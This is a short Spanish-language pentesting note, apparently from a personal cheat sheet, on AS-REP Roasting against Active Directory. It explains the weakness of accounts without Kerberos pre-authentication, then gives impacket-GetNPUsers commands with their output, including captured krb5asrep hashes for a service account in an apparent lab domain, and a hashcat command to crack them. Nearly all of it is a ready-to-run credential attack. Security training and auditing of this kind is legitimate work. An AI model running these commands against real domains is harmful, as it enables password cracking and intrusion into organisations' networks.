# AS\_REP Roasting

El primer paso para pedir un **TGT** es intentar autenticarse al KDC con las credenciales de usuario, si son válidas el **KDC** le entregará el **TGT** al usuario dado, ya que sino cualquiera podría pedir un TGT de otro usuario para intentar crackear por fuerza bruta la contraseña. Pero hay algunos casos en que algunos usuarios **tienen desactivada la pre-autenticación de Kerberos**, por lo que es posible pedir un TGT a nombre de este usuario y tratar de romper el hash.



### Explotación

Listar si el/los usuario/s tienen la pre-autenticación activada

```
# De un usuario
impacket-GetNPUsers gerarcorp.local/SVC_SQLService -no-pas  
                 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for SVC_SQLService
$krb5asrep$23$SVC_SQLService@GERARCORP.LOCAL:1c18c0d8aaecaec478e7a9e7b122a308$a8c121471fa3d625d6149862a03963c44e0f28731d0efea07c7e0d4a9706bea6921ff0120993f19e34b46f3d31a423512bd2b925f60ac6adcfa029f9e1eb9b7fa67fb054113a15c458b5892f5730238c73dbaecb2674e2c17d58e9c5e020459035ab4f65752b6edbfa2561c7788451da014ab72ce915b03c29e8752a2ea9b1babb5ac02542d2f3c320198f23378bd8bacfe3ec710b48053d20ecf1832b1b0ddc41acba141cbaa4a4400f4e37da1fc5f3f047aae55fb9b842faf13ffeee9f65e0356e05c5a98bb5b5588a3620ef2fd5e54d505f60a6c1d99e611c714ca0d909c10d1f7beb2d41d3f128640bc3cfa472265c02

# De varios a través de un fichero
impacket-GetNPUsers gerarcorp.local/ -usersfile usernames.txt -format hashcat

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User Administrador doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User krifel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User admintest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User wdaniel doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$SVC_SQLService@GERARCORP.LOCAL:ae320eb5f8b0ef164dd8e9b8035e7b9f$0350e1267009baa836fdbdc72610ae35f980275b6c4f6313a5ff4799c520d8019d922f0d19e25ef0d76012dbb6f4de361db918d622c9fbde87b67d93d7665fc99e28f9e4d214e6f274a981f961b81e3b34409b196b1b4863f604e1f4e80f9808adc21761697e9de39516622907cabbc0b7e19181a957ee22980d75a6408508a2f8b4fb2752e732c4319e9f1c15adfc9ba542192cb7d5779eae2c415a48ea4fdd56878050e0f0b95ad5afa922f69e2b0f74294a2b1534cc92f5b5ac511c9c3888955d1a0f77de76385faf634bfb31edf4a50b92e8b0fd864e0bb0751437bacadf88b1bfdf893154ee403765b20cc11ace94ea

```

Crackeo con hashcat

```
hashcat -m 18200 -a 0 hash.txt wordlist.txt
```

